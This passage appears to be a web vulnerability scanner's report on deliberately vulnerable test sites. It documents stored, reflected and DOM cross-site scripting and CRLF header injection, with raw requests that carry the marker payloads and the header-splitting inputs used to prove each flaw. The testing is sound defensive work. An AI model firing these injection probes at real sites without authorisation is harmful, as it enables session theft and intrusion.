      body: __EVENTTARGET=sentinel&__EVENTARGUMENT=sentinel&__VIEWSTATE=1%27&__VIEWSTATEGENERATOR=58A73C4D&__EVENTVALIDATION=%2FwEWWQKi3cnWDwKAgcfvBQKFzrr8AQLi%2B%2BjXCAKUl...
    RESPONSE 500
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 23:09:23 GMT
      content-length: 6334
      body[0:200]: <html>
    <head>
        <title>The state information is invalid for this page and might be corrupted.</title>
        <style>
         body {font-family:"Verdana";font-weight:normal;font-size: .
  - `finding` ref `F-9779edbacd` excerpt: `canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Commen`
    finding: xss_stored POST http://testaspnet.vulnweb.com/Comments.aspx param=tbComment status=verified conf=0.9
      evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Comments.aspx?id=2 — survived an ind
      evidence[stored_xss_surfaces]: render surfaces: http://testaspnet.vulnweb.com/Comments.aspx?id=2
      verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2

**[STATE] — verified**

  payload persisted server-side: the canary survived an independent re-fetch on the render surface (engine-observed reflection; the raw journal retains the re-fetch request — its bounded response window does not reach the marker location, so the marker observation is cited from the finding's evidence record)

  - `finding` ref `F-9779edbacd` excerpt: `canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Commen`
    finding: xss_stored POST http://testaspnet.vulnweb.com/Comments.aspx param=tbComment status=verified conf=0.9
      evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Comments.aspx?id=2 — survived an ind
      evidence[stored_xss_surfaces]: render surfaces: http://testaspnet.vulnweb.com/Comments.aspx?id=2
      verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2
  - `journal` ref `req-031633cd` excerpt: `http://testaspnet.vulnweb.com/Comments.aspx?id=2`
    REQUEST  GET http://testaspnet.vulnweb.com/Comments.aspx?id=2
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
    RESPONSE 200
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 22:57:52 GMT
      content-length: 23952
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
	<HEAD>
		<title>Comments</title>
		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
		<meta name="CODE_

**[IMPACT] — inferred**

  defect VERIFIED (canary markup submitted via the real form persisted server-side and rendered RAW on http:/) but the end impact was NOT directly demonstrated (impact grade 'indicated') — the impact claim is inferred from the verified defect, not from an executed demonstration

  - `finding` ref `F-9779edbacd` excerpt: `canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Commen`
    finding: xss_stored POST http://testaspnet.vulnweb.com/Comments.aspx param=tbComment status=verified conf=0.9
      evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Comments.aspx?id=2 — survived an ind
      evidence[stored_xss_surfaces]: render surfaces: http://testaspnet.vulnweb.com/Comments.aspx?id=2
      verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2

</details>


## ginjuice — https://ginandjuice.shop (run run-d2edb73a27, scanner sentinel-core/4.2.3)

**L2 SOURCE (honesty note): v4.3.0 L2 projection over the v4.2.3 live journal (run-d2edb73a27, seed b0c63973) — the engine is verdict-identical (gate verdict-diff vs frozen v4.2.2 = NONE) and L2 is a zero-request pure projection; this environment cannot host a >600s fresh re-scan of this target (measured 620s; a fresh attempt overran the 600s window and was discarded)**

**9 paths: 9 VERIFIED / 0 INFERRED** (7 single-finding, 2 chains) — weak-link histogram: `{}`

Seeds used: `F-277b70ea40, F-4df129b258, F-98386c0986, F-d8bbff4e3e, F-e6ca09b8b8, F-ef23b8b42b, F-fc86abef99`; non-seed findings (annotation-only classes): `{"F-0e125aa746": "missing_security_headers", "F-14a00088c7": "missing_security_headers", "F-1d05d54579": "missing_security_headers", "F-280f9bf333": "missing_security_headers", "F-350d2cadb9": "missing_security_headers", "F-3f3e1d3d49": "missing_security_headers", "F-4775c478d5": "missing_security_headers", "F-4aa457f211": "missing_security_headers", "F-5e46111694": "missing_security_headers", "F-5fbe2a300b": "missing_security_headers", "F-64070c624a": "missing_security_headers", "F-65ab6e47e6": "missing_security_headers", "F-68cf956bbd": "vulnerable_js_dependency", "F-6a222a003d": "missing_security_headers", "F-79832c51cf": "missing_security_headers", "F-7bcb18152c": "missing_security_headers", "F-8ac4aa87f5": "missing_security_headers", "F-8f0527e325": "missing_security_headers", "F-a0965ae454": "missing_security_headers", "F-ac1d876594": "missing_security_headers", "F-ac5a684024": "missing_security_headers", "F-ad7c55cc55": "missing_security_headers", "F-af0cfd6218": "missing_security_headers", "F-bf6d4ca7fb": "missing_security_headers", "F-c4bd93d7b2": "missing_security_headers", "F-df2a3ab1ea": "missing_security_headers", "F-eb5ff2843d": "missing_security_headers", "F-fcd233c3fe": "missing_security_headers"}`


### AP-19dfe77fb7 — VERIFIED — xss_dom at /blog/ — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-fc86abef99 | chain_rule: — | mitigations absent: ["content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy"]

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request |
| **entry** | verified | GET https://ginandjuice.shop/blog/ — parameter search |
| **action** | verified | attacker-controlled data reaches a dangerous DOM sink and executes in the live browser (execution probe fired) |
| **object** | verified | the victim's live DOM (sink executed) |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | Attacker-controlled data reaches a dangerous DOM sink and EXECUTES in a real browser (execution probe fired) — client-side code execution in victims' sessions. |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request

  - `journal` ref `req-766ba3dd` excerpt: `AWSALB=[REDACTED]`
    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%3Csentinelxssmarker%3Epro41%3C%2Fsentinelxssmarker%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:23:25 GMT
      content-type: text/html; charset=utf-8
      content-length: 8681
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
    
  - `finding` ref `F-fc86abef99` excerpt: `source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in l`
    finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
      evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
      verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1

**[ENTRY] — verified**

  GET https://ginandjuice.shop/blog/ — parameter search

  - `finding` ref `F-fc86abef99` excerpt: `source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in l`
    finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
      evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
      verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1
  - `journal` ref `req-25669f7f` excerpt: `https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E`
    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:23:24 GMT
      content-type: text/html; charset=utf-8
      content-length: 8681
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
    

**[ACTION] — verified**

  attacker-controlled data reaches a dangerous DOM sink and executes in the live browser (execution probe fired)

  - `finding` ref `F-fc86abef99` excerpt: `verification: re-probe:fresh-canary (passed=True)`
    finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
      evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
      verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1
  - `journal` ref `req-25669f7f` excerpt: `https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E`
    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:23:24 GMT
      content-type: text/html; charset=utf-8
      content-length: 8681
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
    

**[OBJECT] — verified**

  the victim's live DOM (sink executed)

  - `finding` ref `F-fc86abef99` excerpt: `source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in l`
    finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
      evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
      verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted

  - `journal` ref `req-25669f7f` excerpt: `AWSALB=[REDACTED]`
    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:23:24 GMT
      content-type: text/html; charset=utf-8
      content-length: 8681
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
    
  - `finding` ref `F-fc86abef99` excerpt: `source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in l`
    finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
      evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
      verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-fc86abef99` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
      evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
      verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1

**[IMPACT] — verified**

  Attacker-controlled data reaches a dangerous DOM sink and EXECUTES in a real browser (execution probe fired) — client-side code execution in victims' sessions.

  - `finding` ref `F-fc86abef99` excerpt: `impact grade=proven; chain: re-probe:fresh-canary on GET https://ginandjuice.shop/blog/`
    finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
      evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
      verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1

</details>


### AP-28fd14872c — VERIFIED — xss_reflected at /catalog — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-4df129b258 | chain_rule: — | mitigations absent: ["content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy"]

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request |
| **entry** | verified | GET https://ginandjuice.shop/catalog — parameter category |
| **action** | verified | attacker-supplied markup/JavaScript injected through the parameter survives into the response in an executable context |
| **object** | verified | the HTTP response rendered to the victim |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | Arbitrary attacker-supplied markup/JavaScript survives into the response in an executable context (canary proven) — session theft, credential capture and action forgery in the victim's browser are reachable without furth |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request

  - `journal` ref `req-227a3d3d` excerpt: `AWSALB=[REDACTED]`
    REQUEST  GET https://ginandjuice.shop/catalog?category=Accessories&searchTerm=https%3A%2F%2Fsentinel-redirect-check.example.org%2Fprobe
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:27:54 GMT
      content-type: text/html; charset=utf-8
      content-length: 9781
      connection: keep-alive
      set-cookie: category=Accessories; Secure; HttpOnly
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
  - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
    finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6

**[ENTRY] — verified**

  GET https://ginandjuice.shop/catalog — parameter category

  - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
    finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
  - `journal` ref `req-00eb0dfb` excerpt: `https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed`
    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:22:46 GMT
      content-type: text/html; charset=utf-8
      content-length: 9461
      connection: keep-alive
      set-cookie: category=sentinelcrlf2
      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>

**[ACTION] — verified**

  attacker-supplied markup/JavaScript injected through the parameter survives into the response in an executable context

  - `finding` ref `F-4df129b258` excerpt: `verification: re-test:variant-battery-6 (passed=True)`
    finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
  - `journal` ref `req-00eb0dfb` excerpt: `https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed`
    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:22:46 GMT
      content-type: text/html; charset=utf-8
      content-length: 9461
      connection: keep-alive
      set-cookie: category=sentinelcrlf2
      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>

**[OBJECT] — verified**

  the HTTP response rendered to the victim

  - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
    finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted

  - `journal` ref `req-00eb0dfb` excerpt: `AWSALB=[REDACTED]`
    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:22:46 GMT
      content-type: text/html; charset=utf-8
      content-length: 9461
      connection: keep-alive
      set-cookie: category=sentinelcrlf2
      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
  - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
    finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-4df129b258` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6

**[IMPACT] — verified**

  Arbitrary attacker-supplied markup/JavaScript survives into the response in an executable context (canary proven) — session theft, credential capture and action forgery in the victim's browser are reachable without further preconditions.

  - `finding` ref `F-4df129b258` excerpt: `impact grade=proven; chain: re-test:variant-battery-6 on GET https://ginandjuice.shop/catalog`
    finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6

</details>


### AP-7028304bd9 — VERIFIED — http_response_header_injection at /catalog — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-e6ca09b8b8 | chain_rule: — | mitigations absent: []

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request |
| **entry** | verified | GET https://ginandjuice.shop/catalog — parameter category |
| **action** | verified | attacker-controlled data injected into response headers |
| **object** | verified | the response headers |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | Attacker input reaches a response header (CRLF shape) — header injection into proxies/browsers. |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request

  - `journal` ref `req-09eb9786` excerpt: `AWSALB=[REDACTED]`
    REQUEST  GET https://ginandjuice.shop/catalog?category=%7B%7B7%2A7%7D%7D
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:23:01 GMT
      content-type: text/html; charset=utf-8
      content-length: 9379
      connection: keep-alive
      set-cookie: category={{7*7}}; Secure; HttpOnly
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
  - `finding` ref `F-e6ca09b8b8` excerpt: `CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header`
    finding: http_response_header_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
      verification: re-test:fresh-header-name passed=True conf=0.9 rounds=1

**[ENTRY] — verified**

  GET https://ginandjuice.shop/catalog — parameter category

  - `finding` ref `F-e6ca09b8b8` excerpt: `CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header`
    finding: http_response_header_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
      verification: re-test:fresh-header-name passed=True conf=0.9 rounds=1
  - `journal` ref `req-00eb0dfb` excerpt: `https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed`
    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:22:46 GMT
      content-type: text/html; charset=utf-8
      content-length: 9461
      connection: keep-alive
      set-cookie: category=sentinelcrlf2
      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: <!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>

**[ACTION] — verified**

  attacker-controlled data injected into response headers

  - `finding` ref `F-e6ca09b8b8` excerpt: `verification: re-test:fresh-header-name (passed=True)`
    finding: http_response_header_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
      verification: re-test:fresh-header-name passed=True conf=0.9 rounds=1
  - `journal` ref `req-00eb0dfb` excerpt: `https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed`
    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: AWSALB=[REDACTED]
    RESPONSE 200
      date: Sat, 03 Oct 2026 22:22:46 GMT
      content-type: text/html; charset=utf-8
      content-length: 9461
      connection: keep-alive
      set-cookie: category=sentinelcrlf2
      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
